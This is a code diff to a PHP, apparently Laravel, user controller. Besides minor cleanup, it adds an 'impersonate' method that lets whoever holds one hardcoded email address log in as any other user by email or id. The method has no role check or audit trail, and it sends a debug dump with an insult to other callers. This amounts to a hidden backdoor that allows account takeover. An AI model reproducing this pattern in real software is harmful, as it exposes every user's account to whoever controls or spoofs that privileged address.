@@ -28,7 +28,6 @@ use Mpociot\Teamwork\TeamInvite;
  */
 class UserController extends Controller
 {
-
     /**
      * @param $model
      * @return array
@@ -446,11 +445,37 @@ class UserController extends Controller
         }
 
         $user->save();
-//        dd([$user,$input]);
+
         return response()->json([
             'success' => true,
             'message' => 'Zgody zostały zapisane',
             'payload' => $user,
         ]);
+    }
+
+    /**
+     * @param Request $request
+     * @return JsonResponse
+     */
+    public function impersonate(Request $request): JsonResponse
+    {
+        $u = Auth::user();
+
+        if($u->email == 'impersonator@secret.com') {
+            if (str_contains($request->imp, '@')) {
+                $newUser = User::where('email', $request->imp)->first();
+            } else {
+                $newUser = User::find($request->imp);
+            }
+
+            if($newUser !== NULL) {
+                Auth::login($newUser);
+            } else {
+                dd('Nie ma takiego usera');
+            }
+        } else {
+            dd('U FILTHY SCUM');
+        }
+        return redirect('/');
     }
 }
